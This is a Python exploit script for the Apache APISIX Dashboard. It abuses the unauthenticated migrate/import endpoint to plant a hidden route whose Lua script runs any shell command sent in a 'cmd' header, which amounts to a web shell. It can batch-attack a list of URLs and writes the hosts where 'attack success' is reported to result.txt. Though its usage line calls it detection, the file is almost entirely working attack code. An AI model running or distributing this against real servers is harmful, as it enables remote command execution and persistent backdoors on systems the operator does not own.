#!/usr/bin/env python3


import zlib
import json
import random
import requests
import string
import sys
import argparse
from urllib3.exceptions import InsecureRequestWarning


# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


eval_config = {
    "Counsumers": [],
    "Routes": [
        {
            "id": str(random.randint(100000000000000000, 1000000000000000000)),
            "create_time": 1640674554,
            "update_time": 1640677637,
            "uris": [
                "/rce"
            ],
            "name": "rce",
            "methods": [
                "GET",
                "POST",
                "PUT",
                "DELETE",
                "PATCH",
                "HEAD",
                "OPTIONS",
                "CONNECT",
                "TRACE"
            ],
            "script": "local file = io.popen(ngx.req.get_headers()['cmd'],'r') \n local output = file:read('*all') \n file:close() \n ngx.say(output)",
            "status": 1
        }
    ],
    "Services": [],
    "SSLs": [],
    "Upstreams": [],
    "Scripts": [],
    "GlobalPlugins": [],
    "PluginConfigs": []
}


def usage():
    parser = argparse.ArgumentParser(description="")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--url", help="单目标检测，目标url，如：http://134.209.255.61:9000")
    group.add_argument("-f", "--file", help="批量检测，包含url的文件，每行一个")
    args = parser.parse_args()
    url = args.url
    file = args.file
    if (url != None) and (file == None):
        return url
    elif (url == None) and (file != None):
        return file
    else:
        print("usage: apisix-dashboard-rce-batch-detect.py [-h] [-u URL | -f FILE]")
        sys.exit()


def random_str():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))


def calc_crc(data):
    crc32 = zlib.crc32(data) & 0xffffffff
    return crc32.to_bytes(4, byteorder="big")


def export_data(url):
    r = requests.get(url + "/apisix/admin/migrate/export", verify=False)
    return r.text[:-4]


def import_data(url, data):
    data = json.dumps(data).encode()
    crc32 = calc_crc(data)

    files = {"file": ("data", data + crc32, "text/data")}
    resp = requests.post(url + "/apisix/admin/migrate/import", files=files, verify=False, timeout=5)
    # print(resp.text)
    if resp.json().get("code", -1) == 0:
        return True
    else:
        return False


if __name__ == "__main__":
    uri = random_str()
    eval_config["Routes"][0]["uris"] = [ "/" + uri]
    eval_config["Routes"][0]["name"] = uri

    user_input = usage()
    if isinstance(user_input, str):
        url = user_input
        line = url
        print( "Currently testing {}".format(line) )
        try:
            bool_value = import_data(line, eval_config)
        except Exception as e:
            print(line + "-----" + "happen exception" + "\n")
            sys.exit()
        
        if bool_value:
            print(line + "-----" + "attack success" + ", uri is: " + "/" + uri + "\n")
        else:
            print(line + "-----" + "attack error" + "\n")
    else:
        file = user_input
        with open(file, "r") as fr:
            with open("result.txt", "w") as fw:
                lines = fr.readlines()
                for line in lines:
                    line = line.strip()
                    print( "Currently testing {}".format(line) )
                    try:
                        bool_value = import_data(line, eval_config)
                    except Exception as e:
                        print(line + "-----" + "happen exception" + "\n")
                        continue
                    if bool_value:
                        print(line + "-----" + "attack success" + ", uri is: " + "/" + uri + "\n")
                        fw.write(line + "\n")
                    else:
                        print(line + "-----" + "attack error" + "\n")
